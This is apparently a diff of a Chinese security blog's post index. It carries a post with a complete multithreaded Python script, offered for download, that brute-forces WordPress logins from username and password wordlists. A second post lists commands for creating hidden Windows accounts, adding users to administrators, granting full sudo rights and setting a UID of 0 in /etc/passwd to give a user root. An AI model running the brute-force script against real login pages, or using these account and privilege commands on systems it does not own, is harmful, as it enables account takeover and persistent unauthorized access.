-<pre class="highlight"><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">    描述：爆破脚本，用户名+密码排列组合方式，推荐精简名字典</span><br><span class="line">        支持参数、进度条、Ctrl C功能</span><br><span class="line">    version：2.0</span><br><span class="line">    author：chen</span><br><span class="line">    date：2021-08-13</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import requests</span><br><span class="line">import getopt</span><br><span class="line">import queue</span><br><span class="line">from rich.progress import Progress</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 参数处理</span><br><span class="line">def para(argv):</span><br><span class="line">    global dicts</span><br><span class="line">    dicts = &#123;&#x27;url&#x27;: &#x27;&#x27;, &#x27;thread&#x27;: &#x27;&#x27;, &#x27;delay&#x27;: &#x27;&#x27;, &#x27;file_name&#x27;: &#x27;&#x27;, &#x27;file_pass&#x27;: &#x27;&#x27;&#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        opts, args = getopt.getopt(argv, &quot;u:hT:&quot;, [&quot;url=&quot;, &quot;fname=&quot;, &quot;fpass=&quot;, &quot;delay=&quot;])</span><br><span class="line">    except getopt.GetoptError:</span><br><span class="line">        print(&quot;python brute2.0.py -u http:test.com --fname C:\\Users\\Chen\\Desktop\\Temp\\user.txt --fpass C:\\Users\\Chen\\Desktop\\Temp\\pass.txt -T 100&quot;)</span><br><span class="line"></span><br><span class="line">    for opt, arg in opts:</span><br><span class="line">        if opt == &#x27;-h&#x27;:</span><br><span class="line">            print(&quot;python brute2.0.py -u http:test.com --fname C:\\Users\\Chen\\Desktop\\Temp\\user.txt --fpass C:\\Users\\Chen\\Desktop\\Temp\\pass.txt -T 100&quot;)</span><br><span class="line">            exit()</span><br><span class="line">        elif opt in (&quot;-u&quot;, &quot;--url&quot;):</span><br><span class="line">            dicts[&#x27;url&#x27;] = arg</span><br><span class="line">            # print(&#x27;url:&#x27;, dicts[&#x27;url&#x27;])</span><br><span class="line">        elif opt == &#x27;-T&#x27;:</span><br><span class="line">            dicts[&#x27;thread&#x27;] = arg</span><br><span class="line">            # print(&#x27;线程:&#x27;, dicts[&#x27;thread&#x27;])</span><br><span class="line">        elif opt == &#x27;--delay&#x27;:</span><br><span class="line">            dicts[&#x27;delay&#x27;] = arg</span><br><span class="line">            # print(&#x27;发包延时:%sms&#x27; % dicts[&#x27;delay&#x27;])</span><br><span class="line">        elif opt == &#x27;--fname&#x27;:</span><br><span class="line">            dicts[&#x27;file_name&#x27;] = arg</span><br><span class="line">            # print(&#x27;用户名字典:&#x27;, dicts[&#x27;file_name&#x27;])</span><br><span class="line">        elif opt == &#x27;--fpass&#x27;:</span><br><span class="line">            dicts[&#x27;file_pass&#x27;] = arg</span><br><span class="line">            # print(&#x27;密码字典:&#x27;, dicts[&#x27;file_pass&#x27;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 初始化字典队列</span><br><span class="line">def init(fname, fpass, q):</span><br><span class="line">    # 排列组合模式生成字典队列，两个都过大时会导致初始化很慢。</span><br><span class="line">    # 建议精简用户名字典，合适的密码字典</span><br><span class="line">    print(&#x27;正在初始化字典队列...&#x27;)</span><br><span class="line">    for i in open(fname):</span><br><span class="line">        for j in open(fpass):</span><br><span class="line">            # 以列表形式写入队列</span><br><span class="line">            q.put([i.strip(), j.strip()])</span><br><span class="line">    print(&#x27;字典队列初始化完毕！&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run(q, BarId, url):</span><br><span class="line">    while not q.empty():</span><br><span class="line">        que = q.get()</span><br><span class="line"></span><br><span class="line">        # 爆破目标的核心数据包，根据实际情况更改</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;log&quot;: que[0],</span><br><span class="line">            &quot;pwd&quot;: que[1],</span><br><span class="line">            &quot;wp-submit&quot;: &quot;%E7%99%BB%E5%BD%95&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        # 代理，自定义</span><br><span class="line">        proxy = &#123;</span><br><span class="line">            &#x27;http&#x27;: &#x27;http://127.0.0.1:7890&#x27;,</span><br><span class="line">            &#x27;https&#x27;: &#x27;https://127.0.0.1:7890&#x27;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # 发包，禁止302跳转，否则抓不到302返回状态码</span><br><span class="line">        # 可取消代理</span><br><span class="line">        rep = requests.post(url=url, data=data, allow_redirects=False)</span><br><span class="line">        if rep.status_code == 302:</span><br><span class="line">            print(&#x27;\033[32m爆破成功! &#123;0&#125;:&#123;1&#125;\033[0m&#x27; .format(que[0], que[1]))</span><br><span class="line">            # 爆破成功进度条拉满，触发主进程守护，结束进程</span><br><span class="line">            progress.update(BarId, advance=999999999)</span><br><span class="line">        # 更新进度条</span><br><span class="line">        progress.update(BarId, advance=1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    dicts = &#123;&#125;</span><br><span class="line">    q = queue.Queue()</span><br><span class="line"></span><br><span class="line">    # 初始化参数</span><br><span class="line">    para(sys.argv[1:])</span><br><span class="line">    # 初始化队列</span><br><span class="line">    url = dicts[&#x27;url&#x27;]</span><br><span class="line">    delay = dicts[&#x27;delay&#x27;]</span><br><span class="line">    init(dicts[&#x27;file_name&#x27;], dicts[&#x27;file_pass&#x27;], q)</span><br><span class="line"></span><br><span class="line">    # 进度条初始化</span><br><span class="line">    with Progress() as progress:</span><br><span class="line">        BarId = progress.add_task(&#x27;[green]Status:&#x27;, total=q.qsize())</span><br><span class="line">        # 多线程数量</span><br><span class="line">        for i in range(int(dicts[&#x27;thread&#x27;])):</span><br><span class="line">            # 设置主线程守护</span><br><span class="line">            t = threading.Thread(target=run, args=[q, BarId, url, delay], daemon=True)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">        # 进度条结束，终止主程序运行</span><br><span class="line">        # 解决Ctrl+C终止程序 和 程序自动结束的问题</span><br><span class="line">        while not progress.finished:</span><br><span class="line">            pass</span><br><span class="line"></span><br></pre>
-
-
-
-<p>4、下载</p>
-<p><a href="https://www.zerochen.top/download/Burst/Burst2.0.py">https://www.zerochen.top/download/Burst/Burst2.0.py</a></p>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>爆破</tag>
       </tags>
   </entry>
   <entry>
@@ -4755,6 +4718,60 @@
       </categories>
       <tags>
         <tag>Redis</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python之爆破脚本</title>
+    <url>/article/Python%E4%B9%8B%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>利用爆破功能脚本，熟悉参数、进度条模块的使用。</p>
+<h1 id="二、模块介绍"><a href="#二、模块介绍" class="headerlink" title="二、模块介绍"></a>二、模块介绍</h1><p><strong>参数模块</strong></p>
+<p>getopt函数</p>
+<pre class="highlight"><span class="line">import sys, getopt</span><br><span class="line"></span><br><span class="line">def main(argv):</span><br><span class="line">   inputfile = &#x27;&#x27;</span><br><span class="line">   outputfile = &#x27;&#x27;</span><br><span class="line">   try:</span><br><span class="line">      opts, args = getopt.getopt(argv,&quot;hi:o:&quot;,[&quot;ifile=&quot;,&quot;ofile=&quot;])</span><br><span class="line">   except getopt.GetoptError:</span><br><span class="line">      print (&#x27;test.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;&#x27;)</span><br><span class="line">      sys.exit(2)</span><br><span class="line">   for opt, arg in opts:</span><br><span class="line">      if opt == &#x27;-h&#x27;:</span><br><span class="line">         print (&#x27;test.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;&#x27;)</span><br><span class="line">         sys.exit()</span><br><span class="line">      elif opt in (&quot;-i&quot;, &quot;--ifile&quot;):</span><br><span class="line">         inputfile = arg</span><br><span class="line">      elif opt in (&quot;-o&quot;, &quot;--ofile&quot;):</span><br><span class="line">         outputfile = arg</span><br><span class="line">   print (&#x27;输入的文件为：&#x27;, inputfile)</span><br><span class="line">   print (&#x27;输出的文件为：&#x27;, outputfile)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">   main(sys.argv[1:])</span><br><span class="line"></span><br></pre>
+
+<p>说明：</p>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>argv[1:]</td>
+<td>不限制参数数量（&gt;1）</td>
+</tr>
+<tr>
+<td>try:  <br>&#9;pass  <br>except  getopt.GetoptError:  <br>&#9;pass</td>
+<td>异常捕捉，参数不存在时报错，提示正确的用法</td>
+</tr>
+<tr>
+<td>opts,args=getopt.getopt(argv,”hi:o”,[“ifile=”,”ofile=”])</td>
+<td>定义短标签（-）和长标签（–）  <br>短标签:表示必须有此参数，长标签=同理  <br><br>注意！经实验得知，<code>:、=</code>号使用时，只要会被用到传参的参数，都必须要加，否则会接收不到变量值。而不是说明文档中让人产生歧义的说法，让人误以为是可有可无的参数都不用加<code>:、=</code></td>
+</tr>
+<tr>
+<td>for opt, arg in opts:     <br>&#9;if opt == ‘-h’:       <br>&#9;&#9;print (<code>&#39;test.py -i &lt;inputfile&gt;  -o &lt;outputfile&gt;&#39;</code>)       <br>&#9;&#9;sys.exit()     <br>&#9;elif opt in (“-i”,  “–ifile”):       <br>&#9;&#9;inputfile = arg</td>
+<td>for循环判断匹配参数  ，opt为参数，arg为参数值</td>
+</tr>
+</tbody></table>
+<p><strong>进度条模块</strong></p>
+<p>rich</p>
+<pre class="highlight"><span class="line">from rich.progress import Progress		# 模块导入</span><br><span class="line"></span><br><span class="line">with Progress() as progress:			# 模块初始化，需要嵌套在主进程函数之外，total标表示总任务数</span><br><span class="line">        task = progress.add_task(&#x27;[green]Downloading...&#x27;, total=1000)   </span><br><span class="line"> </span><br><span class="line">while not progress.finished:			# 任务函数用使用，更新进度条，advance每次更新的长度</span><br><span class="line">        progress.update(task, advance=5)</span><br><span class="line"></span><br></pre>
+
+
+
+<p>三、代码</p>
+<pre class="highlight"><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">    描述：爆破脚本，用户名+密码排列组合方式，推荐精简名字典</span><br><span class="line">        支持参数、进度条、Ctrl C功能</span><br><span class="line">    version：2.0</span><br><span class="line">    author：chen</span><br><span class="line">    date：2021-08-13</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import requests</span><br><span class="line">import getopt</span><br><span class="line">import queue</span><br><span class="line">from rich.progress import Progress</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 参数处理</span><br><span class="line">def para(argv):</span><br><span class="line">    global dicts</span><br><span class="line">    dicts = &#123;&#x27;url&#x27;: &#x27;&#x27;, &#x27;thread&#x27;: &#x27;&#x27;, &#x27;delay&#x27;: &#x27;&#x27;, &#x27;file_name&#x27;: &#x27;&#x27;, &#x27;file_pass&#x27;: &#x27;&#x27;&#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        opts, args = getopt.getopt(argv, &quot;u:hT:&quot;, [&quot;url=&quot;, &quot;fname=&quot;, &quot;fpass=&quot;, &quot;delay=&quot;])</span><br><span class="line">    except getopt.GetoptError:</span><br><span class="line">        print(&quot;python brute2.0.py -u http:test.com --fname C:\\Users\\Chen\\Desktop\\Temp\\user.txt --fpass C:\\Users\\Chen\\Desktop\\Temp\\pass.txt -T 100&quot;)</span><br><span class="line"></span><br><span class="line">    for opt, arg in opts:</span><br><span class="line">        if opt == &#x27;-h&#x27;:</span><br><span class="line">            print(&quot;python brute2.0.py -u http:test.com --fname C:\\Users\\Chen\\Desktop\\Temp\\user.txt --fpass C:\\Users\\Chen\\Desktop\\Temp\\pass.txt -T 100&quot;)</span><br><span class="line">            exit()</span><br><span class="line">        elif opt in (&quot;-u&quot;, &quot;--url&quot;):</span><br><span class="line">            dicts[&#x27;url&#x27;] = arg</span><br><span class="line">            # print(&#x27;url:&#x27;, dicts[&#x27;url&#x27;])</span><br><span class="line">        elif opt == &#x27;-T&#x27;:</span><br><span class="line">            dicts[&#x27;thread&#x27;] = arg</span><br><span class="line">            # print(&#x27;线程:&#x27;, dicts[&#x27;thread&#x27;])</span><br><span class="line">        elif opt == &#x27;--delay&#x27;:</span><br><span class="line">            dicts[&#x27;delay&#x27;] = arg</span><br><span class="line">            # print(&#x27;发包延时:%sms&#x27; % dicts[&#x27;delay&#x27;])</span><br><span class="line">        elif opt == &#x27;--fname&#x27;:</span><br><span class="line">            dicts[&#x27;file_name&#x27;] = arg</span><br><span class="line">            # print(&#x27;用户名字典:&#x27;, dicts[&#x27;file_name&#x27;])</span><br><span class="line">        elif opt == &#x27;--fpass&#x27;:</span><br><span class="line">            dicts[&#x27;file_pass&#x27;] = arg</span><br><span class="line">            # print(&#x27;密码字典:&#x27;, dicts[&#x27;file_pass&#x27;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 初始化字典队列</span><br><span class="line">def init(fname, fpass, q):</span><br><span class="line">    # 排列组合模式生成字典队列，两个都过大时会导致初始化很慢。</span><br><span class="line">    # 建议精简用户名字典，合适的密码字典</span><br><span class="line">    print(&#x27;正在初始化字典队列...&#x27;)</span><br><span class="line">    for i in open(fname):</span><br><span class="line">        for j in open(fpass):</span><br><span class="line">            # 以列表形式写入队列</span><br><span class="line">            q.put([i.strip(), j.strip()])</span><br><span class="line">    print(&#x27;字典队列初始化完毕！&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run(q, BarId, url):</span><br><span class="line">    while not q.empty():</span><br><span class="line">        que = q.get()</span><br><span class="line"></span><br><span class="line">        # 爆破目标的核心数据包，根据实际情况更改</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;log&quot;: que[0],</span><br><span class="line">            &quot;pwd&quot;: que[1],</span><br><span class="line">            &quot;wp-submit&quot;: &quot;%E7%99%BB%E5%BD%95&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        # 代理，自定义</span><br><span class="line">        proxy = &#123;</span><br><span class="line">            &#x27;http&#x27;: &#x27;http://127.0.0.1:7890&#x27;,</span><br><span class="line">            &#x27;https&#x27;: &#x27;https://127.0.0.1:7890&#x27;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # 发包，禁止302跳转，否则抓不到302返回状态码</span><br><span class="line">        # 可取消代理</span><br><span class="line">        rep = requests.post(url=url, data=data, allow_redirects=False)</span><br><span class="line">        if rep.status_code == 302:</span><br><span class="line">            print(&#x27;\033[32m爆破成功! &#123;0&#125;:&#123;1&#125;\033[0m&#x27; .format(que[0], que[1]))</span><br><span class="line">            # 爆破成功进度条拉满，触发主进程守护，结束进程</span><br><span class="line">            progress.update(BarId, advance=999999999)</span><br><span class="line">        # 更新进度条</span><br><span class="line">        progress.update(BarId, advance=1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    dicts = &#123;&#125;</span><br><span class="line">    q = queue.Queue()</span><br><span class="line"></span><br><span class="line">    # 初始化参数</span><br><span class="line">    para(sys.argv[1:])</span><br><span class="line">    # 初始化队列</span><br><span class="line">    url = dicts[&#x27;url&#x27;]</span><br><span class="line">    delay = dicts[&#x27;delay&#x27;]</span><br><span class="line">    init(dicts[&#x27;file_name&#x27;], dicts[&#x27;file_pass&#x27;], q)</span><br><span class="line"></span><br><span class="line">    # 进度条初始化</span><br><span class="line">    with Progress() as progress:</span><br><span class="line">        BarId = progress.add_task(&#x27;[green]Status:&#x27;, total=q.qsize())</span><br><span class="line">        # 多线程数量</span><br><span class="line">        for i in range(int(dicts[&#x27;thread&#x27;])):</span><br><span class="line">            # 设置主线程守护</span><br><span class="line">            t = threading.Thread(target=run, args=[q, BarId, url, delay], daemon=True)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">        # 进度条结束，终止主程序运行</span><br><span class="line">        # 解决Ctrl+C终止程序 和 程序自动结束的问题</span><br><span class="line">        while not progress.finished:</span><br><span class="line">            pass</span><br><span class="line"></span><br></pre>
+
+
+
+<p>4、下载</p>
+<p><a href="https://www.zerochen.top/download/Burst/Burst2.0.py">https://www.zerochen.top/download/Burst/Burst2.0.py</a></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>爆破</tag>
       </tags>
   </entry>
   <entry>
@@ -6270,6 +6287,54 @@
       </tags>
   </entry>
   <entry>
+    <title>创建用户+提权</title>
+    <url>/article/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7-%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>需要为管理员权限</p>
+<h1 id="linux环境"><a href="#linux环境" class="headerlink" title="linux环境"></a>linux环境</h1><h2 id="1、创建普通用户"><a href="#1、创建普通用户" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">useradd test	#创建test用户</span><br><span class="line">passwd test		#给test用户设置密码</span><br></pre>
+
+<h2 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>a、修改/etc/sudoers文件，将#去掉</p>
+<pre class="highlight"><span class="line">## Allows people in group wheel to run all commands</span><br><span class="line">%wheel    ALL=(ALL)    ALL</span><br></pre>
+
+<p>b、然后修改用户，使其属于root组</p>
+<pre class="highlight"><span class="line">usermod -g root test</span><br></pre>
+
+<p>c、使用test账号登录，su -切回root，再切回test即为root权限</p>
+<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>a、修改/etc/sudoers文件，找到root并添加</p>
+<pre class="highlight"><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root    ALL=(ALL)     ALL</span><br><span class="line">test   	ALL=(ALL)     ALL</span><br></pre>
+
+<p>b、使用test账号登录，即可使用sudo权限操作</p>
+<p>如：sudo ls</p>
+<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>a、修改/etc/passwd文件，找到添加用户，并修改用户ID为0</p>
+<pre class="highlight"><span class="line">test:x:0:1000::/home/test:/bin/sh</span><br></pre>
+
+<p>b、切换至test用户，输入test密码即可登陆至root账户</p>
+<h2 id="3、删除用户"><a href="#3、删除用户" class="headerlink" title="3、删除用户"></a>3、删除用户</h2><pre class="highlight"><span class="line">userdel -r test		#删除用户及其主目录</span><br></pre>
+
+<h2 id="注！非交互式shell修改密码"><a href="#注！非交互式shell修改密码" class="headerlink" title="注！非交互式shell修改密码"></a>注！非交互式shell修改密码</h2><pre class="highlight"><span class="line">echo &quot;test:123&quot; | chpasswd</span><br><span class="line"></span><br><span class="line">echo &quot;123&quot; | passwd --stdin &quot;test&quot;</span><br></pre>
+
+
+
+<h1 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h1><h2 id="1、创建普通用户-1"><a href="#1、创建普通用户-1" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">net user test 123456 /add		#添加test用户，密码为12356</span><br><span class="line">net user $test 123456 /add		#添加隐藏test用户，密码为12356</span><br></pre>
+
+<h2 id="2、添加用户至管理员组"><a href="#2、添加用户至管理员组" class="headerlink" title="2、添加用户至管理员组"></a>2、添加用户至管理员组</h2><pre class="highlight"><span class="line">net localgroup administrators test /add		#添加test用户至管理员组</span><br></pre>
+
+<p>查看管理员组成员</p>
+<pre class="highlight"><span class="line">net localgroup administrators		#查看管理员组成员</span><br></pre>
+
+<p>删除用户</p>
+<pre class="highlight"><span class="line">net localgroup administrators test /del		#删除用户</span><br></pre>
+
+<p>禁用用户/启用用户</p>
+<pre class="highlight"><span class="line">net user test /active:no		#禁用test用户</span><br><span class="line">net user test /active:yes		#启用test用户</span><br></pre>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>信息收集</title>
     <url>/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
     <content><![CDATA[<table>
@@ -6496,54 +6561,6 @@
       </categories>
       <tags>
         <tag>入侵排查</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>创建用户+提权</title>
-    <url>/article/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7-%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>需要为管理员权限</p>
-<h1 id="linux环境"><a href="#linux环境" class="headerlink" title="linux环境"></a>linux环境</h1><h2 id="1、创建普通用户"><a href="#1、创建普通用户" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">useradd test	#创建test用户</span><br><span class="line">passwd test		#给test用户设置密码</span><br></pre>
-
-<h2 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>a、修改/etc/sudoers文件，将#去掉</p>
-<pre class="highlight"><span class="line">## Allows people in group wheel to run all commands</span><br><span class="line">%wheel    ALL=(ALL)    ALL</span><br></pre>
-
-<p>b、然后修改用户，使其属于root组</p>
-<pre class="highlight"><span class="line">usermod -g root test</span><br></pre>
-
-<p>c、使用test账号登录，su -切回root，再切回test即为root权限</p>
-<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>a、修改/etc/sudoers文件，找到root并添加</p>
-<pre class="highlight"><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root    ALL=(ALL)     ALL</span><br><span class="line">test   	ALL=(ALL)     ALL</span><br></pre>
-
-<p>b、使用test账号登录，即可使用sudo权限操作</p>
-<p>如：sudo ls</p>
-<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>a、修改/etc/passwd文件，找到添加用户，并修改用户ID为0</p>
-<pre class="highlight"><span class="line">test:x:0:1000::/home/test:/bin/sh</span><br></pre>
-
-<p>b、切换至test用户，输入test密码即可登陆至root账户</p>
-<h2 id="3、删除用户"><a href="#3、删除用户" class="headerlink" title="3、删除用户"></a>3、删除用户</h2><pre class="highlight"><span class="line">userdel -r test		#删除用户及其主目录</span><br></pre>
-
-<h2 id="注！非交互式shell修改密码"><a href="#注！非交互式shell修改密码" class="headerlink" title="注！非交互式shell修改密码"></a>注！非交互式shell修改密码</h2><pre class="highlight"><span class="line">echo &quot;test:123&quot; | chpasswd</span><br><span class="line"></span><br><span class="line">echo &quot;123&quot; | passwd --stdin &quot;test&quot;</span><br></pre>
-
-
-
-<h1 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h1><h2 id="1、创建普通用户-1"><a href="#1、创建普通用户-1" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">net user test 123456 /add		#添加test用户，密码为12356</span><br><span class="line">net user $test 123456 /add		#添加隐藏test用户，密码为12356</span><br></pre>
-
-<h2 id="2、添加用户至管理员组"><a href="#2、添加用户至管理员组" class="headerlink" title="2、添加用户至管理员组"></a>2、添加用户至管理员组</h2><pre class="highlight"><span class="line">net localgroup administrators test /add		#添加test用户至管理员组</span><br></pre>
-
-<p>查看管理员组成员</p>
-<pre class="highlight"><span class="line">net localgroup administrators		#查看管理员组成员</span><br></pre>
-
-<p>删除用户</p>
-<pre class="highlight"><span class="line">net localgroup administrators test /del		#删除用户</span><br></pre>
-
-<p>禁用用户/启用用户</p>
-<pre class="highlight"><span class="line">net user test /active:no		#禁用test用户</span><br><span class="line">net user test /active:yes		#启用test用户</span><br></pre>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
